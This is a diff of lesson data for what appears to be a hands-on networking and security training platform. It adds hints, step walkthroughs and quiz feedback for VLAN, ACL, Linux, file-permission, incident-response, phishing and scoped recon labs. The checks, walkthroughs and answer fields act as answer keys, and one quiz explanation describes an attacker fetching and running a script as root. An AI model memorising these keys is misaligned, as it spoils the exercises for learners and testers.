+      "S1",
+      "priv",
+      "show interfaces trunk",
+      "Shows which ports are trunks and the VLANs they carry."
+     ]
+    ]
    },
    {
     "id": "native",
     "text": "Set native VLAN 99 on both ends of both trunks.",
     "hint": "switchport trunk native vlan 99 on S1 Gi0/1 and Gi0/2, S2 Gi0/1 and S3 Gi0/1",
+    "nudge": "The native VLAN is the one a trunk carries untagged. Set it on every trunk end, on all three switches, so both sides agree.",
     "check": {
      "native": {
       "vlan": 99,
@@ -3273,12 +3937,54 @@
       ]
      }
     },
-    "why": "Untagged frames on a trunk belong to the native VLAN. Moving it off VLAN 1 to an unused VLAN makes VLAN hopping harder. Both ends must match: until they do, CDP warns of a mismatch and untagged traffic lands in the wrong VLAN."
+    "why": "Untagged frames on a trunk belong to the native VLAN. Moving it off VLAN 1 to an unused VLAN makes VLAN hopping harder. Both ends must match: until they do, CDP warns of a mismatch and untagged traffic lands in the wrong VLAN.",
+    "walk": [
+     [
+      "S1",
+      "config",
+      "interface range gi0/1 - 2",
+      "Both of S1's uplinks again."
+     ],
+     [
+      "S1",
+      "sub",
+      "switchport trunk native vlan 99",
+      "Untagged frames on the trunk now belong to VLAN 99 (Management), not VLAN 1.",
+      "interface range gi0/1 - 2"
+     ],
+     [
+      "S2",
+      "config",
+      "interface gi0/1",
+      "S2's end of the trunk: both ends must match."
+     ],
+     [
+      "S2",
+      "sub",
+      "switchport trunk native vlan 99",
+      "Same native VLAN as S1's end.",
+      "interface gi0/1"
+     ],
+     [
+      "S3",
+      "config",
+      "interface gi0/1",
+      "S3's end of the trunk."
+     ],
+     [
+      "S3",
+      "sub",
+      "switchport trunk native vlan 99",
+      "Same native VLAN as S1's end.",
+      "interface gi0/1"
+     ]
+    ]
    },
    {
     "id": "verify",
     "text": "Prove it: ping PC4 from PC1, PC5 from PC2 and PC6 from PC3.",
     "hint": "PC1: ping 10.10.10.14, PC2: ping 10.10.20.15, PC3: ping 10.10.30.16",
+    "nudge": "From each PC, ping its partner in the same VLAN on another switch.",
     "check": {
      "all": [
       {
@@ -3307,7 +4013,27 @@
       }
      ]
     },
-    "why": "Each VLAN now reaches across the trunks, and the VLANs still can't reach each other: that's the point. To let them talk, add a router or a layer 3 switch (inter-VLAN routing)."
+    "why": "Each VLAN now reaches across the trunks, and the VLANs still can't reach each other: that's the point. To let them talk, add a router or a layer 3 switch (inter-VLAN routing).",
+    "walk": [
+     [
+      "PC1",
+      "pc",
+      "ping 10.10.10.14",
+      "Staff to Staff, across two switches and the trunk."
+     ],
+     [
+      "PC2",
+      "pc",
+      "ping 10.10.20.15",
+      "Students to Students."
+     ],
+     [
+      "PC3",
+      "pc",
+      "ping 10.10.30.16",
+      "Guest to Guest."
+     ]
+    ]
    }
   ],
   "next": [
@@ -3552,6 +4278,7 @@
     "id": "stuck",
     "text": "From PC1 (Staff), ping PC2 (Students) at 10.10.20.12. PC1's gateway is 10.10.10.1.",
     "hint": "Choose PC1, then: ping 10.10.20.12",
+    "nudge": "Ping from PC1 to a PC in another VLAN. Nothing routes between VLANs yet, so watch what happens.",
     "check": {
      "pinged": {
       "from": "PC1",
@@ -3559,12 +4286,21 @@
       "ok": false
      }
     },
-    "why": "PC2 is on another network, so PC1 sends the ping to its gateway, 10.10.10.1. Nothing answers for that address yet, so Windows reports \"Destination host unreachable\" from PC1's own address."
+    "why": "PC2 is on another network, so PC1 sends the ping to its gateway, 10.10.10.1. Nothing answers for that address yet, so Windows reports \"Destination host unreachable\" from PC1's own address.",
+    "walk": [
+     [
+      "PC1",
+      "pc",
+      "ping 10.10.20.12",
+      "Staff to Students: different VLANs and subnets, and nothing routes between them yet."
+     ]
+    ]
    },
    {
     "id": "trunk",
     "text": "On S1, make Fa0/24 (the cable to R1) an 802.1Q trunk.",
     "hint": "On S1: enable, conf t, interface fa0/24, switchport mode trunk",
+    "nudge": "The router needs every VLAN over one cable, so S1's port to it has to carry them all.",
     "check": {
      "trunks": [
       [
@@ -3573,24 +4309,56 @@
       ]
      ]
     },
-    "why": "One cable will carry all three VLANs to the router, each frame tagged with its VLAN. A router doesn't negotiate trunks (DTP), so the switch end is set to trunk."
+    "why": "One cable will carry all three VLANs to the router, each frame tagged with its VLAN. A router doesn't negotiate trunks (DTP), so the switch end is set to trunk.",
+    "walk": [
+     [
+      "S1",
+      "config",
+      "interface fa0/24",
+      "Opens the port the router plugs into."
+     ],
+     [
+      "S1",
+      "sub",
+      "switchport mode trunk",
+      "The router needs every VLAN on one cable, tagged.",
+      "interface fa0/24"
+     ]
+    ]
    },
    {
     "id": "up",
     "text": "On R1, bring up GigabitEthernet0/0. Router interfaces start shut down.",
     "hint": "On R1: enable, conf t, interface g0/0, no shutdown",
+    "nudge": "Router ports start switched off. Open the interface and turn it on.",
     "check": {
      "routerUp": {
       "device": "R1",
       "port": "G0/0"
      }
     },
-    "why": "Unlike a switch port, a router interface is administratively down until you say no shutdown. The physical interface needs no address: the subinterfaces will carry them."
+    "why": "Unlike a switch port, a router interface is administratively down until you say no shutdown. The physical interface needs no address: the subinterfaces will carry them.",
+    "walk": [
+     [
+      "R1",
+      "config",
+      "interface g0/0",
+      "Opens the router's port to the switch."
+     ],
+     [
+      "R1",
+      "sub",
+      "no shutdown",
+      "Router ports start switched off; this turns it on.",
+      "interface g0/0"
+     ]
+    ]
    },
    {
     "id": "sub10",
     "text": "On R1, create subinterface G0/0.10 for VLAN 10 with the address 10.10.10.1 255.255.255.0.",
     "hint": "interface g0/0.10, encapsulation dot1Q 10, ip address 10.10.10.1 255.255.255.0",
+    "nudge": "A subinterface is a virtual port for one VLAN: create it, tell it which VLAN tag to use, then give it the gateway address.",
     "check": {
      "subif": {
       "device": "R1",
@@ -3600,12 +4368,35 @@
       "mask": "255.255.255.0"
      }
     },
-    "why": "A subinterface is a virtual interface on one cable. encapsulation dot1Q 10 says which VLAN's tagged frames it handles; the address makes it VLAN 10's gateway. The tag has to come before the address."
+    "why": "A subinterface is a virtual interface on one cable. encapsulation dot1Q 10 says which VLAN's tagged frames it handles; the address makes it VLAN 10's gateway. The tag has to come before the address.",
+    "walk": [
+     [
+      "R1",
+      "config",
+      "interface g0/0.10",
+      "A subinterface: one logical port per VLAN on the same cable."
+     ],
+     [
+      "R1",
+      "sub",
+      "encapsulation dot1Q 10",
+      "It handles frames tagged VLAN 10.",
+      "interface g0/0.10"
+     ],
+     [
+      "R1",
+      "sub",
+      "ip address 10.10.10.1 255.255.255.0",
+      "Staff's default gateway.",
+      "interface g0/0.10"
+     ]
+    ]
    },
    {
     "id": "subs",
     "text": "Do the same for VLAN 20 (10.10.20.1) and VLAN 30 (10.10.30.1).",
     "hint": "interface g0/0.20, encapsulation dot1Q 20, ip address 10.10.20.1 255.255.255.0, then the same for .30",
+    "nudge": "Repeat the same three settings for the other two VLANs.",
     "check": {
      "all": [
       {
@@ -3628,12 +4419,55 @@
       }
      ]
     },
-    "why": "Each VLAN gets its own subinterface and gateway address. The subinterface number (.20) is just a name; the dot1Q number is what must match the VLAN."
+    "why": "Each VLAN gets its own subinterface and gateway address. The subinterface number (.20) is just a name; the dot1Q number is what must match the VLAN.",
+    "walk": [
+     [
+      "R1",
+      "config",
+      "interface g0/0.20",
+      "The Students subinterface."
+     ],
+     [
+      "R1",
+      "sub",
+      "encapsulation dot1Q 20",
+      "Frames tagged VLAN 20.",
+      "interface g0/0.20"
+     ],
+     [
+      "R1",
+      "sub",
+      "ip address 10.10.20.1 255.255.255.0",
+      "Students' default gateway.",
+      "interface g0/0.20"
+     ],
+     [
+      "R1",
+      "config",
+      "interface g0/0.30",
+      "The Guest subinterface."
+     ],
+     [
+      "R1",
+      "sub",
+      "encapsulation dot1Q 30",
+      "Frames tagged VLAN 30.",
+      "interface g0/0.30"
+     ],
+     [
+      "R1",
+      "sub",
+      "ip address 10.10.30.1 255.255.255.0",
+      "Guest's default gateway.",
+      "interface g0/0.30"
+     ]
+    ]
    },
    {
     "id": "routed",
     "text": "From PC1, ping PC2 again.",
     "hint": "On PC1: ping 10.10.20.12",
+    "nudge": "The router can now pass traffic between VLANs. Try the same ping again.",
     "check": {
      "pinged": {
       "from": "PC1",
@@ -3641,24 +4475,42 @@
       "ok": true
      }
     },
-    "why": "PC1 sends to its gateway (R1 G0/0.10), R1 routes it out of G0/0.20, tagged VLAN 20, and PC2 replies through its own gateway. One cable in, the same cable out: a router on a stick."
+    "why": "PC1 sends to its gateway (R1 G0/0.10), R1 routes it out of G0/0.20, tagged VLAN 20, and PC2 replies through its own gateway. One cable in, the same cable out: a router on a stick.",
+    "walk": [
+     [
+      "PC1",
+      "pc",
+      "ping 10.10.20.12",
+      "Staff to Students again: the router now passes it between VLANs."
+     ]
+    ]
    },
    {
     "id": "table",
     "text": "On R1, look at the routing table.",
     "hint": "show ip route (from config mode: do show ip route)",
+    "nudge": "A router lists the networks it knows in its routing table. Ask R1 to show it.",
     "check": {
      "ran": {
       "device": "R1",
       "cmd": "show ip route"
      }
     },
-    "why": "Every network with an up interface appears as C (connected), with the router's own address as L (local, /32). R1 needs no static routes or routing protocol: it's directly connected to all three VLANs."
+    "why": "Every network with an up interface appears as C (connected), with the router's own address as L (local, /32). R1 needs no static routes or routing protocol: it's directly connected to all three VLANs.",
+    "walk": [
+     [
+      "R1",
+      "priv",
+      "show ip route",
+      "Three connected networks, one per subinterface: that's what lets it route."
+     ]
+    ]
    },
    {
     "id": "acl",
     "text": "Students mustn't reach staff. On R1, create an extended ACL named STUDENTS that denies 10.10.20.0/24 to 10.10.10.0/24 and permits everything else. Apply it inbound on G0/0.20.",
     "hint": "ip access-list extended STUDENTS, deny ip 10.10.20.0 0.0.0.255 10.10.10.0 0.0.0.255, permit ip any any, then interface g0/0.20, ip access-group STUDENTS in",
+    "nudge": "Write a named extended access list: one line that denies Students to Staff, one that permits everything else. Then apply it inbound on the Students subinterface.",
     "check": {
      "all": [
       {
@@ -3692,12 +4544,48 @@
       }
      ]
     },
-    "why": "The wildcard 0.0.0.255 means \"any value in the last octet\". Order matters (first match wins), and every ACL ends with an invisible deny everything, so the permit line keeps students' other traffic working. Inbound on .20 filters traffic as it leaves the student VLAN, close to its source."
+    "why": "The wildcard 0.0.0.255 means \"any value in the last octet\". Order matters (first match wins), and every ACL ends with an invisible deny everything, so the permit line keeps students' other traffic working. Inbound on .20 filters traffic as it leaves the student VLAN, close to its source.",
+    "walk": [
+     [
+      "R1",
+      "config",
+      "ip access-list extended STUDENTS",
+      "A named list of rules, checked top to bottom."
+     ],
+     [
+      "R1",
+      "sub",
+      "deny ip 10.10.20.0 0.0.0.255 10.10.10.0 0.0.0.255",
+      "Students can't reach Staff.",
+      "ip access-list extended STUDENTS"
+     ],
+     [
+      "R1",
+      "sub",
+      "permit ip any any",
+      "Everything else is allowed. Without it, the hidden deny at the end blocks all.",
+      "ip access-list extended STUDENTS"
+     ],
+     [
+      "R1",
+      "config",
+      "interface g0/0.20",
+      "The Students subinterface."
+     ],
+     [
+      "R1",
+      "sub",
+      "ip access-group STUDENTS in",
+      "Checks traffic coming in from Students against the list.",
+      "interface g0/0.20"
+     ]
+    ]
    },
    {
     "id": "blocked",
     "text": "From PC2 (Students), ping PC1 (Staff).",
     "hint": "On PC2: ping 10.10.10.11",
+    "nudge": "Test the rule from the side it's meant to stop.",
     "check": {
      "pinged": {
       "from": "PC2",
@@ -3706,12 +4594,21 @@
       "blocked": true
      }
     },
-    "why": "The ping arrives on G0/0.20 and matches the deny line, so R1 drops it. show access-lists on R1 shows the matches."
+    "why": "The ping arrives on G0/0.20 and matches the deny line, so R1 drops it. show access-lists on R1 shows the matches.",
+    "walk": [
+     [
+      "PC2",
+      "pc",
+      "ping 10.10.10.11",
+      "Students to Staff: the list drops it."
+     ]
+    ]
    },
    {
     "id": "guest",
     "text": "From PC2, ping PC3 (Guest). It should still work.",
     "hint": "On PC2: ping 10.10.30.13",
+    "nudge": "Check the rule hasn't blocked more than it should.",
     "check": {
      "pinged": {
       "from": "PC2",
@@ -3720,12 +4617,21 @@
       "withAcl": true
      }
     },
-    "why": "It doesn't match the deny line, so it falls through to permit ip any any. Without that line, the implicit deny would have cut students off from everything."
+    "why": "It doesn't match the deny line, so it falls through to permit ip any any. Without that line, the implicit deny would have cut students off from everything.",
+    "walk": [
+     [
+      "PC2",
+      "pc",
+      "ping 10.10.30.13",
+      "Students to Guest: still allowed."
+     ]
+    ]
    },
    {
     "id": "twist",
     "text": "From PC1 (Staff), ping PC2. The rule only blocks students, so why does this fail?",
     "hint": "On PC1: ping 10.10.20.12, then on R1: show access-lists",
+    "nudge": "It fails one way only. Replies come back in through the Students subinterface too: look at the list's hit counts.",
     "check": {
      "pinged": {
       "from": "PC1",
@@ -3734,7 +4640,21 @@
       "blocked": true
      }
     },
-    "why": "The ping gets to PC2, but its reply (10.10.20.12 to 10.10.10.11) comes in on G0/0.20 and matches the deny line. ACLs check each packet on its own, with no memory of what went out. Real networks let replies back with a stateful firewall, or the established keyword for TCP."
+    "why": "The ping gets to PC2, but its reply (10.10.20.12 to 10.10.10.11) comes in on G0/0.20 and matches the deny line. ACLs check each packet on its own, with no memory of what went out. Real networks let replies back with a stateful firewall, or the established keyword for TCP.",
+    "walk": [
+     [
+      "PC1",
+      "pc",
+      "ping 10.10.20.12",
+      "Staff to Students fails now too: the reply comes back in from Students and the list drops it."
+     ],
+     [
+      "R1",
+      "priv",
+      "show access-lists",
+      "The match counts show which rule caught it."
+     ]
+    ]
    }
   ],
   "next": [
@@ -4192,6 +5112,7 @@
   "lesson": "linux",
   "skill": "Navigate, read, search and fix files from the command line",
   "intro": "A simulated Linux server with a small set of real commands. Type help to see them.",
+  "simplification": "A simulated Ubuntu-style bash shell with about 30 commands and a small file system. Groups, sudo and real script execution are not modelled: a script prints its echo lines.",
   "user": "analyst",
   "host": "web-01",
   "home": "/home/analyst",
@@ -4312,6 +5233,22 @@
     "id": "where",
     "text": "Find out who you are and which folder you're in.",
     "hint": "whoami, then pwd",
+    "nudge": "Two short commands answer this: one prints your user name, the other prints the folder you're in.",
+    "why": "Before changing anything on a server, check who you are and where you are. Most mistakes start with being the wrong user or in the wrong folder.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "whoami",
+      "Prints the account you're logged in as. Here: analyst, an ordinary user, not root."
+     ],
+     [
+      "web-01",
+      "pc",
+      "pwd",
+      "Prints the folder you're in (print working directory). You start in your home folder."
+     ]
+    ],
     "check": {
      "ran": [
       "whoami",
@@ -4323,6 +5260,16 @@
     "id": "hidden",
     "text": "List everything in your home folder, including hidden files.",
     "hint": "ls -a",
+    "nudge": "The list command hides names that start with a dot, unless you add the option for 'all'.",
+    "why": "Files whose names start with a dot are hidden from a plain ls. Attackers and admins both leave things there, such as .bash_history.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "ls -a ~",
+      "ls lists a folder; -a adds the hidden dot files; ~ is short for your home folder, wherever you are."
+     ]
+    ],
     "check": {
      "ls": {
       "dir": "/home/analyst",
@@ -4334,6 +5281,16 @@
     "id": "note",
     "text": "Read the note in notes.txt.",
     "hint": "cat notes.txt",
+    "nudge": "One command prints a whole file to the screen. The file is in your home folder.",
+    "why": "Reading before acting: the night shift left notes on what broke. cat prints a file's contents to the screen.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "cat ~/notes.txt",
+      "cat prints the file. The note points you at /var/log/auth.log and /opt/backup."
+     ]
+    ],
     "check": {
      "read": "/home/analyst/notes.txt"
     }
@@ -4342,6 +5299,16 @@
     "id": "logs",
     "text": "Move to the folder that holds the system logs.",
     "hint": "cd /var/log",
+    "nudge": "System logs live under /var. Change folder to the logs folder there.",
+    "why": "On Linux, system logs live in /var/log. Working from inside that folder keeps the next commands short.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "cd /var/log",
+      "cd changes folder. A path starting with / is absolute: it works from anywhere."
+     ]
+    ],
     "check": {
      "cwd": "/var/log"
     }
@@ -4350,6 +5317,16 @@
     "id": "failed",
     "text": "Show only the failed login lines in auth.log.",
     "hint": "grep \"Failed password\" auth.log",
+    "nudge": "Search inside the file for lines that contain a phrase. A phrase with a space in it goes in quotes.",
+    "why": "auth.log records every login attempt. Searching it beats reading it: grep prints only the lines that match.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "grep \"Failed password\" /var/log/auth.log",
+      "Quotes keep the two words together as one pattern. Each line is one failed SSH login."
+     ]
+    ],
     "check": {
      "grep": {
       "file": "/var/log/auth.log",
@@ -4361,6 +5338,16 @@
     "id": "count",
     "text": "Count the failed logins with a pipe (|), which sends one command's output into the next.",
     "hint": "grep Failed auth.log | wc -l",
+    "nudge": "Search for the failed lines, then send that output into a command that counts lines.",
+    "why": "A count is what goes in a report: \"4 failed logins from one address\". A pipe (|) feeds one command's output into the next.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "grep Failed /var/log/auth.log | wc -l",
+      "grep picks the failed lines, then wc -l counts them instead of printing them."
+     ]
+    ],
     "check": {
      "piped": [
       "grep",
@@ -4372,6 +5359,16 @@
     "id": "find",
     "text": "Search the whole system for a file called backup.sh.",
     "hint": "find / -name backup.sh",
+    "nudge": "There's a command that searches folders for files by name. Start it at the very top of the file system.",
+    "why": "The note says the backup script is broken, but not exactly where it is. find searches folders for files by name.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "find / -name backup.sh",
+      "Starts at / (the whole system) and prints every path whose name is backup.sh."
+     ]
+    ],
     "check": {
      "found": "/opt/backup/backup.sh"
     }
@@ -4380,6 +5377,16 @@
     "id": "tryrun",
     "text": "Try to run the backup script. What happens?",
     "hint": "/opt/backup/backup.sh (or cd there and run ./backup.sh)",
+    "nudge": "Run a script by typing its full path. You found the path in the last step.",
+    "why": "Reproduce the fault before fixing it, so you know your fix is what made it work. syslog says cron got Permission denied.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "/opt/backup/backup.sh",
+      "Running a script by its path. Expect Permission denied: the file isn't marked as runnable."
+     ]
+    ],
     "check": {
      "tried": "/opt/backup/backup.sh"
     }
@@ -4388,6 +5395,22 @@
     "id": "fix",
     "text": "Make the script executable, then run it successfully.",
     "hint": "chmod +x /opt/backup/backup.sh, then run it again",
+    "nudge": "A file needs the execute permission to run. Add it, then run the script again.",
+    "why": "A script needs the execute (x) permission to run. You own this one, so you can add it yourself: no sudo needed.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "chmod +x /opt/backup/backup.sh",
+      "chmod changes permissions; +x adds execute. ls -l would now show rwx."
+     ],
+     [
+      "web-01",
+      "pc",
+      "/opt/backup/backup.sh",
+      "Run it again to prove the fix worked."
+     ]
+    ],
     "check": {
      "executed": "/opt/backup/backup.sh"
     }
@@ -4396,6 +5419,22 @@
     "id": "report",
     "text": "Create a folder called reports in your home folder, with an empty file incident.txt inside it.",
     "hint": "mkdir ~/reports, then touch ~/reports/incident.txt",
+    "nudge": "Make the folder first, then create an empty file inside it. ~ means your home folder.",
+    "why": "Every incident needs a written record. Keep reports in your home folder, where you can write.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "mkdir ~/reports",
+      "mkdir makes a folder. ~ means your home folder, /home/analyst."
+     ],
+     [
+      "web-01",
+      "pc",
+      "touch ~/reports/incident.txt",
+      "touch creates an empty file, ready to write your notes into."
+     ]
+    ],
     "check": {
      "exists": "/home/analyst/reports/incident.txt"
     }
@@ -4404,6 +5443,22 @@
     "id": "tidy",
     "text": "Delete the old temp file in /tmp, and nothing else.",
     "hint": "rm /tmp/old.tmp",
+    "nudge": "Look in /tmp before deleting anything, then remove only the old file.",
+    "why": "rm deletes for good: there is no recycle bin. Name the exact file, and never use a wildcard you haven't checked with ls first.",
+    "walk": [
+     [
+      "web-01",
+      "pc",
+      "ls /tmp",
+      "Look before you delete: old.tmp is the one to go, session.lock is in use."
+     ],
+     [
+      "web-01",
+      "pc",
+      "rm /tmp/old.tmp",
+      "Deletes just that one file. ls /tmp again would show only session.lock."
+     ]
+    ],
     "check": {
      "missing": "/tmp/old.tmp",
      "keep": "/tmp/session.lock"
@@ -4530,15 +5585,26 @@
     "id": "look",
     "text": "See the permissions: run ls -l in /srv/payroll.",
     "hint": "ls -l",
+    "nudge": "Start by listing the folder in the long format, which shows each file's permissions, owner and group.",
     "check": {
      "ran": "ls -l"
     },
-    "why": "Each line shows the type and permissions (-rw-r--r--), links, owner, group, size, date and name. The nine letters are three sets of rwx: owner, group, others."
+    "why": "Each line shows the type and permissions (-rw-r--r--), links, owner, group, size, date and name. The nine letters are three sets of rwx: owner, group, others.",
+    "found": "salaries.csv is -rw-r--r--. The last r is for others: anyone on the server, dave included, can read everyone's pay.",
+    "walk": [
+     [
+      "marlow-fs",
+      "pc",
+      "ls -l",
+      "The long listing: type and permissions, links, owner, group, size, date, name."
+     ]
+    ]
    },
    {
     "id": "overshared",
     "text": "salaries.csv is -rw-r--r--, so dave the intern can read everyone's pay. Fix it: finance can read it, only alice can change it, nobody else gets anything.",
     "hint": "chmod 640 salaries.csv, or switch off the others r in the grid",
+    "nudge": "Keep read and write for the owner and read for the group, and take everything away from others. The octal number or the switch grid both work.",
     "check": {
      "all": [
       [
@@ -4573,12 +5639,22 @@
       ]
      ]
     },
-    "why": "640 is rw- r-- ---: the owner reads and writes, the finance group reads, others get nothing. Fixing over-sharing means taking access away, not adding it for anyone."
+    "why": "640 is rw- r-- ---: the owner reads and writes, the finance group reads, others get nothing. Fixing over-sharing means taking access away, not adding it for anyone.",
+    "found": "640 is rw-r-----: alice can change it, finance can read it, and everyone else gets nothing. dave's Read is now ✗.",
+    "walk": [
+     [
+      "marlow-fs",
+      "pc",
+      "chmod 640 salaries.csv",
+      "6 = rw- for the owner (alice), 4 = r-- for the group (finance), 0 = --- for everyone else."
+     ]
+    ]
    },
    {
     "id": "folder",
     "text": "Lock the payroll folder: people outside finance can't list it or go into it, but finance still can.",
     "hint": "chmod 750 /srv/payroll (or chmod o-rx /srv/payroll)",
+    "nudge": "On a folder, r lets you list it and x lets you go into it. Keep both for the owner and the group; take them from others.",
     "check": {
      "all": [
       [
@@ -4613,12 +5689,22 @@
       ]
      ]
     },
-    "why": "Without x on the folder, nobody outside finance can reach any file inside it, whatever that file's own bits say. Two locks are better than one."
+    "why": "Without x on the folder, nobody outside finance can reach any file inside it, whatever that file's own bits say. Two locks are better than one.",
+    "found": "750 on the folder: finance can list it and go in; for everyone else it's shut, so they can't reach any file inside, even one left open.",
+    "walk": [
+     [
+      "marlow-fs",
+      "pc",
+      "chmod 750 /srv/payroll",
+      "7 = rwx for alice, 5 = r-x so finance can list and enter, 0 keeps everyone else out."
+     ]
+    ]
    },
    {
     "id": "script",
     "text": "backup.sh has no x bit, so it can't run. Make it runnable by carol only, and unreadable by everyone else.",
     "hint": "chmod 700 /srv/scripts/backup.sh (or chmod u+x,go-r /srv/scripts/backup.sh)",
+    "nudge": "The owner needs read, write and execute. The group and others need nothing at all.",
     "check": {
      "all": [
       [
@@ -4653,12 +5739,22 @@
       ]
      ]
     },
-    "why": "700 is rwx --- ---. To run a script, its owner needs x (and r, because the shell reads it). Even root can only run a file that has an x bit somewhere."
+    "why": "700 is rwx --- ---. To run a script, its owner needs x (and r, because the shell reads it). Even root can only run a file that has an x bit somewhere.",
+    "found": "700 is rwx------: only carol can read, change or run it. root can still read it, because root skips read and write checks.",
+    "walk": [
+     [
+      "marlow-fs",
+      "pc",
+      "chmod 700 /srv/scripts/backup.sh",
+      "7 = rwx for carol, the owner; 0 and 0 give the group and others nothing."
+     ]
+    ]
    },
    {
     "id": "oneclass",
     "text": "Try a trap: set salaries.csv to 460 (r-- rw- ---). Who can change it now?",
     "hint": "chmod 460 /srv/payroll/salaries.csv, then look at the Change column",
+    "nudge": "Give the owner read only and the group read and write, then look at alice's Change column.",
     "check": {
      "mode": [
       "/srv/payroll/salaries.csv",
@@ -4679,12 +5775,22 @@
       ]
      ]
     },
-    "why": "alice owns the file, so only the owner bits (r--) count for her, even though her group has rw-. Linux picks one class and stops; it never adds them together. bob, in the group, can change it and alice can't."
+    "why": "alice owns the file, so only the owner bits (r--) count for her, even though her group has rw-. Linux picks one class and stops; it never adds them together. bob, in the group, can change it and alice can't.",
+    "found": "Only one class applies to a person: alice is the owner, so the owner's r-- decides, and the group's rw- doesn't help her. bob, in finance, can change it.",
+    "walk": [
+     [
+      "marlow-fs",
+      "pc",
+      "chmod 460 /srv/payroll/salaries.csv",
+      "4 = r-- for the owner, 6 = rw- for the group, 0 for others. Watch who can change it now."
+     ]
+    ]
    },
    {
     "id": "handover",
     "text": "Finally: bob takes over payroll. Set salaries.csv back to 640 and make bob its owner (group still finance).",
     "hint": "chmod 640 /srv/payroll/salaries.csv, then chown bob /srv/payroll/salaries.csv",
+    "nudge": "Two changes: put the permissions back the way you first fixed them, then change who owns the file.",
     "check": {
      "mode": [
       "/srv/payroll/salaries.csv",
@@ -4721,7 +5827,22 @@
       ]
      ]
     },
-    "why": "Only root can give a file to someone else (chown). Now alice falls into the group bits: she can still read the file but not change it."
+    "why": "Only root can give a file to someone else (chown). Now alice falls into the group bits: she can still read the file but not change it.",
+    "found": "bob owns it now with rw-, and alice still reads it as a member of finance. Ownership follows the job, not the person.",
+    "walk": [
+     [
+      "marlow-fs",
+      "pc",
+      "chmod 640 /srv/payroll/salaries.csv",
+      "Back to rw-r-----: the owner changes it, finance reads it."
+     ],
+     [
+      "marlow-fs",
+      "pc",
+      "chown bob /srv/payroll/salaries.csv",
+      "chown changes the owner. The group stays finance."
+     ]
+    ]
    }
   ],
   "next": [
@@ -5010,7 +6131,12 @@
     ],
     "answer": 1,
     "explain": "The sudo lines show backup running wget to fetch x.sh from the attacker's IP, then executing it as root. Assume full compromise of web-01.",
-    "where": "sudo"
+    "where": "sudo",
+    "notes": [
+     "Read the sudo lines after the login again: they did far more than look around.",
+     null,
+     "The logs can tell you: sudo records the exact command every time it's used."
+    ]
    },
    {
     "type": "choice",
@@ -5022,7 +6148,13 @@
      "Wait to see if it happens again"
     ],
     "answer": 1,
-    "explain": "Contain first: stop the attacker's access and spread, but keep the evidence. 198.51.100.7 was just a user mistyping a password before logging in normally."
+    "explain": "Contain first: stop the attacker's access and spread, but keep the evidence. 198.51.100.7 was just a user mistyping a password before logging in normally.",
+    "notes": [
+     "198.51.100.7 failed twice and then logged in normally: someone mistyping a password. The attacker is elsewhere.",
+     null,
+     "Deleting logs destroys your evidence, which is exactly what an attacker would want.",
+     "Waiting gives the attacker more time, and they already have root on web-01."
+    ]
    }
   ],
   "category": "SOC & incident response",
@@ -5063,7 +6195,13 @@
     ],
     "answer": 1,
     "explain": "The Received and Return-Path lines show mail-x7-delivery.example. The From line is just text the sender typed, and it's trivial to fake.",
-    "where": "mail-x7-delivery.example"
+    "where": "mail-x7-delivery.example",
+    "notes": [
+     "That's the From line, which the sender types and can fake. Follow the Received and Return-Path lines instead.",
+     null,
+     "halcyonlabs.example is Jordan's own organisation: its server received the email, it didn't send it.",
+     "quickmail.example only appears in Reply-To, where answers would go. It didn't send the message."
+    ]
    },
    {
     "type": "choice",
@@ -5076,7 +6214,13 @@
     ],
     "answer": 2,
     "explain": "SPF checks whether the sending server is allowed to send for that domain. spf=fail means it isn't.",
-    "where": "spf="
+    "where": "spf=",
+    "notes": [
+     "Read the Authentication-Results line again: the SPF result isn't pass.",
+     "softfail is the domain saying 'probably not' (~all), and the header would read spf=softfail. This one says something stronger.",
+     null,
+     "none means the domain publishes no SPF record at all. Here a check ran and gave a result."
+    ]
    },
    {
     "type": "text",
@@ -5097,7 +6241,11 @@
     ],
     "answer": 1,
     "explain": "DMARC failing means the message didn't prove it came from northvalebank.example. Combined with urgency and a mismatched Reply-To, it's phishing.",
-    "where": "dmarc="
+    "where": "dmarc=",
+    "notes": [
+     "A real bank alert would pass DMARC. This one failed it, has a Reply-To on another domain, and pushes a 12-hour deadline.",
+     null
+    ]
    }
   ],
   "category": "Identity & email",
@@ -5176,7 +6324,10 @@
  },
  {
   "id": "recon-basics",
-  "safety": ["sim", "scan"],
+  "safety": [
+   "sim",
+   "scan"
+  ],
   "kind": "nettools",
   "category": "Ethical hacking",
   "track": "Ethical hacking",
@@ -5186,6 +6337,7 @@
   "title": "Authorised recon: staying in scope",
   "host": "pentest-vm",
   "intro": "Before any security test comes written permission that names exactly what you may touch. Here you practise finding hosts and open ports inside the authorised range, and what happens if you stray outside it.",
+  "simplification": "discover stands in for a scanner such as Nmap and refuses anything outside the lab's scope. Real scanners never check permission for you: that's your job.",
   "net": {
    "scope": "10.10.10.0/24",
    "me": {
@@ -5269,8 +6421,19 @@
   "tasks": [
    {
     "id": "scope",
-    "text": "Read the engagement scope. Know exactly what you're allowed to test.",
+    "text": "Read the engagement scope in scope.txt. Know exactly what you're allowed to test.",
     "hint": "cat scope.txt",
+    "nudge": "The rules of engagement are in a text file here. Print it before touching anything.",
+    "why": "Permission comes first. The scope says exactly which addresses you may test; everything else is off limits, even next door.",
+    "found": "You may test 10.10.10.0/24 (10.10.10.0 to 10.10.10.255) and nothing else. 10.10.20.0/24 is named as out of scope.",
+    "walk": [
+     [
+      "kali",
+      "pc",
+      "cat scope.txt",
+      "The rules of engagement: 10.10.10.0/24 only, and 10.10.20.0/24 is named as out of scope."
+     ]
+    ],
     "check": {
      "read": "scope.txt"
     }
@@ -5279,6 +6442,17 @@
     "id": "sweep",
     "text": "Find which hosts are up across the authorised range.",
     "hint": "discover 10.10.10.0/24",
+    "nudge": "This lab's scanner is called discover. Give it the whole authorised range, written as a CIDR (address/size).",
+    "why": "Find out which machines are up before looking at any of them, so time goes on real targets.",
+    "found": "Four hosts answer: the gateway, web.lab, files.lab and db.lab. Each one's open ports are your list of things to look at.",
+    "walk": [
+     [
+      "kali",
